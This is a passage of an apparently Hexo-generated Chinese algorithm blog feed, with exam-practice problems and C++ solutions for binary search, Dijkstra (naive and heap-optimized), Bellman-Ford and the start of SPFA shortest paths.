class="hljs-number">0</span>;i&lt;n;i++)  cin&gt;&gt;num[i];<br>    num[n] = d;<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>,right = <span class="hljs-number">1e9</span>;<br>    <span class="hljs-keyword">while</span>(left&lt;right)&#123;<br>        <span class="hljs-type">int</span> mid = (left + right + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>,cur = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;=n;i++)&#123;<br>            <span class="hljs-keyword">if</span>(num[i] - cur &lt; mid) cnt++;<br>            <span class="hljs-keyword">else</span> cur = num[i];<br>        &#125;<br>        <span class="hljs-keyword">if</span>(cnt &lt;= k) left = mid;<br>        <span class="hljs-keyword">else</span> right = mid - <span class="hljs-number">1</span>;<br>    &#125;<br>    cout&lt;&lt;left&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-路标设置"><a href="#2-路标设置" class="headerlink" title="2. 路标设置"></a>2. 路标设置</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p>B 市和 T 市之间有一条长长的高速公路，这条公路的某些地方设有路标，但是大家都感觉路标设得太少了，相邻两个路标之间往往隔着相当长的一段距离。为了便于研究这个问题，我们把公路上相邻路标的最大距离定义为该公路的“空旷指数”。</p><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>现在政府决定在公路上增设一些路标，使得公路的“空旷指数”最小。他们请求你设计一个程序计算能达到的最小值是多少。请注意，公路的起点和终点保证已设有路标，公路的长度为整数，并且原有路标和新设路标都必须距起点整数个单位距离。</p><h3 id="输入格式-5"><a href="#输入格式-5" class="headerlink" title="输入格式"></a>输入格式</h3><p>第 $1$ 行包括三个数 $L,N,K$，分别表示公路的长度，原有路标的数量，以及最多可增设的路标数量。</p><p>第 $2$ 行包括递增排列的 $N$ 个整数，分别表示原有的 $N$ 个路标的位置。路标的位置用距起点的距离表示，且一定位于区间 $[0,L]$ 内。</p><h3 id="输出格式-5"><a href="#输出格式-5" class="headerlink" title="输出格式"></a>输出格式</h3><p>输出 $1$ 行，包含一个整数，表示增设路标后能达到的最小“空旷指数”值。</p><h3 id="样例-2"><a href="#样例-2" class="headerlink" title="样例"></a>样例</h3><h4 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">101 </span><span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">101</span><br></code></pre></td></tr></table></figure><h4 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">51<br></code></pre></td></tr></table></figure><h4 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h4><p>公路原来只在起点和终点处有两个路标，现在允许新增一个路标，应该把新路标设在距起点 $50$ 或 $51$ 个单位距离处，这样能达到最小的空旷指数 $51$。</p><p>$50%$ 的数据中，$2 \leq N \leq 100$，$0 \leq K \leq 100$。</p><p>$100%$ 的数据中，$2 \leq N \leq 100000$, $0 \leq K \leq100000$。</p><p>$100%$ 的数据中，$0 &lt; L \leq 10000000$。</p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>这道题思想和前面比较类似，我们可以用二分来寻找答案。我们设置一个间隔，当设置这个间隔所要插入的路标数大于最大插入数时，说明我们间隔小了，当小于等于最大插入数时，我们可以继续尝试缩小间隔。<strong>这题难点在于如何计算需要插入的数</strong></p><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> l,n,k;<br><span class="hljs-type">int</span> num[N];<br><span class="hljs-comment">// 这部分是难点</span><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> mid)</span></span>&#123;<br>    <span class="hljs-type">int</span> cnt = k,cur = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i&lt;n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(cnt &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span>(num[i] - cur &lt;= mid) cur = num[i];<br>        <span class="hljs-keyword">else</span>&#123;<br>            cur += mid;<br>            i --;<br>            cnt --;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(cnt &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;l&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;num[i];<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>,right = l;<br>    <span class="hljs-type">int</span> ans ;<br>    <span class="hljs-keyword">while</span>(left&lt;=right)&#123;<br>        <span class="hljs-type">int</span> mid = left + (right - left) / <span class="hljs-number">2</span> ;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid))&#123;<br>            ans = mid;<br>            right = mid - <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> left = mid + <span class="hljs-number">1</span>;<br>    &#125;<br>    cout&lt;&lt;ans&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>保研</tag>
      
      <tag>机试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>图论</title>
    <link href="/2024/03/31/%E5%9B%BE%E8%AE%BA/"/>
    <url>/2024/03/31/%E5%9B%BE%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="图论"><a href="#图论" class="headerlink" title="图论"></a>图论</h1><p><img src="https://s2.loli.net/2023/03/24/O7u1xAR3yiUkncf.png" alt="图片"></p><p>在计算最短路时，Dijkstra算法不能处理带有负权的图，bellman_ford和spfa可以处理带有负权边的图，spfa是对bellman_ford的优化。</p><h2 id="Dijkstra算法"><a href="#Dijkstra算法" class="headerlink" title="Dijkstra算法"></a>Dijkstra算法</h2><p><strong>在Dijkstra算法中，稠密图使用邻接矩阵，稀疏图使用邻接表</strong></p><h3 id="朴素Dijkstra算法"><a href="#朴素Dijkstra算法" class="headerlink" title="朴素Dijkstra算法"></a>朴素Dijkstra算法</h3><p><strong>在使用Dijkstra算法时，如果有向图中出现重边或者是有环的话，只采用代价最小的边</strong></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个 <span class="hljs-built_in">n</span>个点 m条边的有向图，图中可能存在重边和自环，所有边权均为正值。<br>请你求出 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离，如果无法从 <span class="hljs-number">1</span>号点走到 <span class="hljs-built_in">n</span>号点，则输出 −<span class="hljs-number">1</span>。<br><br>输入格式<br>第一行包含整数 <span class="hljs-built_in">n</span>和 m。<br>接下来 m行每行包含三个整数 x,y,z，表示存在一条从点 x到点 y的有向边，边长为 z。<br><br>输出格式<br>输出一个整数，表示 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离。<br>如果路径不存在，则输出 −<span class="hljs-number">1</span>。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">500</span>,<br><span class="hljs-number">1</span>≤m≤<span class="hljs-number">105</span>,<br>图中涉及边长均不超过<span class="hljs-number">10000</span>。<br><br>输入样例：<br><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br>输出样例：<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">510</span>;<br><span class="hljs-type">int</span> n,m,g[N][N],dist[N];<br><span class="hljs-type">bool</span> st[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)&#123;<br>        <span class="hljs-type">int</span> t=<span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            <span class="hljs-keyword">if</span>(!st[j]&amp;&amp;(t==<span class="hljs-number">-1</span>||dist[t]&gt;dist[j]))<br>                t=j;<br>        st[t]=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            dist[j]=<span class="hljs-built_in">min</span>(dist[j],dist[t]+g[t][j]);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-built_in">memset</span>(g,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> g);<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,c;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>        g[a][b]=<span class="hljs-built_in">min</span>(g[a][b],c);<br>    &#125;<br>    <span class="hljs-type">int</span> t = <span class="hljs-built_in">dijkstra</span>();<br>    cout&lt;&lt;t&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="堆优化Dijkstra算法"><a href="#堆优化Dijkstra算法" class="headerlink" title="堆优化Dijkstra算法"></a>堆优化Dijkstra算法</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个 <span class="hljs-built_in">n</span>个点 m条边的有向图，图中可能存在重边和自环，所有边权均为非负值。<br>请你求出 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离，如果无法从 <span class="hljs-number">1</span>号点走到 <span class="hljs-built_in">n</span>号点，则输出 −<span class="hljs-number">1</span>。<br><br>输入格式<br>第一行包含整数 <span class="hljs-built_in">n</span>和 m。<br>接下来 m行每行包含三个整数 x,y,z，表示存在一条从点 x到点 y的有向边，边长为 z。<br><br>输出格式<br>输出一个整数，表示 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最短距离。如果路径不存在，则输出 −<span class="hljs-number">1</span>。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>,m≤<span class="hljs-number">1.5</span>×<span class="hljs-number">105</span>,<br>图中涉及边长均不小于 <span class="hljs-number">0</span>，且不超过 <span class="hljs-number">10000</span>。数据保证：如果最短路存在，则最短路的长度不超过 <span class="hljs-number">109</span>。<br><br>输入样例：<br><span class="hljs-number">3</span> <span class="hljs-number">3</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">2</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br>输出样例：<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">2e5</span>;<br><span class="hljs-type">int</span> h[N],n,m,ne[N],val[N],idx,w[N],dist[N];<br><span class="hljs-type">bool</span> state[N];<br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    val[idx]=b;<br>    w[idx]=c;<br>    ne[idx]=h[a];<br>    h[a]=idx++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dijkstra</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<span class="hljs-comment">//默认将dist置为最大</span><br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<span class="hljs-comment">//将第一个点置为0</span><br>    priority_queue&lt;PII,vector&lt;PII&gt;,greater&lt;PII&gt;&gt;q;<span class="hljs-comment">//设置堆</span><br>    q.<span class="hljs-built_in">push</span>(&#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>&#125;);<br>    <span class="hljs-keyword">while</span>(q.<span class="hljs-built_in">size</span>())<span class="hljs-comment">//堆不为空就循环</span><br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.<span class="hljs-built_in">top</span>();<span class="hljs-comment">//取出堆首元素</span><br>        q.<span class="hljs-built_in">pop</span>();<br>        <span class="hljs-type">int</span> ver = t.second,distance = t.first;<br>        <span class="hljs-keyword">if</span>(state[ver]) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果访问到已经最优的结点就进行下次循环</span><br>        state[ver]=<span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=h[ver];i!=<span class="hljs-number">-1</span>;i=ne[i])<span class="hljs-comment">//循环每一条可以访问的边</span><br>        &#123;<br>            <span class="hljs-type">int</span> j=val[i];<br>            <span class="hljs-keyword">if</span>(dist[j]&gt;dist[ver]+w[i])&#123; <span class="hljs-comment">// 如果满足更新条件就更新</span><br>                dist[j]=dist[ver]+w[i];<br>                q.<span class="hljs-built_in">push</span>(&#123;dist[j],j&#125;);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(dist[n]==<span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(h,<span class="hljs-number">-1</span>,<span class="hljs-keyword">sizeof</span> h);<br>    cin&gt;&gt;n&gt;&gt;m;<br>    <span class="hljs-keyword">while</span>(m--)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,c;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;<br>        <span class="hljs-built_in">add</span>(a,b,c);<br>    &#125;<br>    <span class="hljs-keyword">auto</span> t=<span class="hljs-built_in">dijkstra</span>();<br>    cout&lt;&lt;t&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="bellman-ford"><a href="#bellman-ford" class="headerlink" title="bellman_ford"></a>bellman_ford</h2><p>Bellman-ford 算法是求含负权图的单源最短路径的一种算法，效率较低，代码难度较小。其原理为连续进行松弛，在每次松弛时把每条边都更新一下，若在 n-1 次松弛后还能更新，则说明图中有负环，因此无法得出结果，否则就完成。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个 <span class="hljs-built_in">n</span>个点 m条边的有向图，图中可能存在重边和自环， 边权可能为负数。<br>请你求出从 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最多经过 k条边的最短距离，如果无法从 <span class="hljs-number">1</span>号点走到 <span class="hljs-built_in">n</span>号点，输出 impossible。<br>注意：图中可能 存在负权回路 。<br><br>输入格式<br>第一行包含三个整数 <span class="hljs-built_in">n</span>,m,k。<br>接下来 m行，每行包含三个整数 x,y,z，表示存在一条从点 x到点 y的有向边，边长为 z。<br>点的编号为 <span class="hljs-number">1</span>∼<span class="hljs-built_in">n</span>。<br><br>输出格式<br>输出一个整数，表示从 <span class="hljs-number">1</span>号点到 <span class="hljs-built_in">n</span>号点的最多经过 k条边的最短距离。<br>如果不存在满足条件的路径，则输出 impossible。<br><br>数据范围<br><span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>,k≤<span class="hljs-number">500</span>,<br><span class="hljs-number">1</span>≤m≤<span class="hljs-number">10000</span>,<br><span class="hljs-number">1</span>≤x,y≤<span class="hljs-built_in">n</span>，<br>任意边长的绝对值不超过 <span class="hljs-number">10000</span>。<br><br>输入样例：<br><span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span><br><span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span><br>输出样例：<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">510</span>,M=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> dist[N],backup[N],n,m,k;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">edge</span><br>&#123;<br>    <span class="hljs-type">int</span> a,b,w;<br>&#125;edge[M];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">bellman_ford</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>]=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++)<br>    &#123;<br>        <span class="hljs-built_in">memcpy</span>(backup,dist,<span class="hljs-keyword">sizeof</span> dist);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;m;j++)<br>        &#123;<br>            <span class="hljs-type">int</span> a=edge[j].a,b=edge[j].b,w=edge[j].w;<br>            <span class="hljs-keyword">if</span>(dist[b]&gt;backup[a]+w)<br>                dist[b]=backup[a]+w;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++)<br>    &#123;<br>        <span class="hljs-type">int</span> a,b,w;<br>        cin&gt;&gt;a&gt;&gt;b&gt;&gt;w;<br>        edge[i]=&#123;a,b,w&#125;;<br>    &#125;<br>    <span class="hljs-built_in">bellman_ford</span>();<br>    <span class="hljs-keyword">if</span>(dist[n]&gt;<span class="hljs-number">0x3f3f3f3f</span>/<span class="hljs-number">2</span>) cout&lt;&lt;<span class="hljs-string">&quot;impossible&quot;</span>&lt;&lt;endl;<br>    <span class="hljs-comment">//为啥是0x3f3f3f3f/2，因为当存在负权边的时候，每次更新dist都会变小，但我们还是认为他是正无穷</span><br>    <span class="hljs-keyword">else</span> cout&lt;&lt;dist[n]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="spfa算法"><a href="#spfa算法" class="headerlink" title="spfa算法"></a>spfa算法</h2><p>Bellman_ford算法会遍历所有的边，但是有很多的边遍历了其实没有什么意义，我们只用遍历那些到源点距离变小的点所连接的边即可，只有当一个点的前驱结点更新了，该节点才会得到更新；因此考虑到这一点，我们将创建一个队列每一次加入距离被更新的结点。</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个 